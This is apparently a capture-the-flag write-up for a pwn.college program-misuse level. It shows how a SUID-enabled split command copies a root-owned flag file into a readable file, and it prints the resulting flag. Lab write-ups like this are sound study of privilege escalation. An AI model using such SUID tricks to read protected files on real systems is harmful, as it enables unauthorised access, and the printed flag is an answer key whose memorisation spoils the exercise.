In this problem, a new command is introduced which is 'split'.

Split command in linux is used to split a large file into smaller parts. It is particularly useful when a large file is needed to be broken down for easier handling or transmission.

```bash
hacker@program-misuse-level-16:~$ cd  /
hacker@program-misuse-level-16:/$ cd challenge/
hacker@program-misuse-level-16:/challenge$ ls
babysuid_level16
hacker@program-misuse-level-16:/challenge$ ./babysuid_level16 
Welcome to ./babysuid_level16!

This challenge is part of a series of programs that
require you to understand their output to derive the flag from it.

I just set the SUID bit on /usr/bin/split.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level16) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/split!
hacker@program-misuse-level-16:/challenge$ cd /
hacker@program-misuse-level-16:/$ ls
bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-16:/$ split flag
hacker@program-misuse-level-16:/$ ls
bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  xaa
hacker@program-misuse-level-16:/$ file xaa
xaa: ASCII text
hacker@program-misuse-level-16:/$ ls -l xaa
-rw-r--r-- 1 root hacker 57 Jan  1 17:20 xaa
hacker@program-misuse-level-16:/$ cat xaa
pwn.college{ksKEyXJQsWUKdh6nE-ni7m8gY0I.0FO1EDL0AjNzQzW}
```

So here we can see that after writing 'split flag' in the terminal, a new file is created in the directory named `xaa`.

Here we can see after running `ls -l xaa`, the permissions are `-rw-r--r--` so we have the read permission. I mean the user `hacker`. So we can `cat` it.


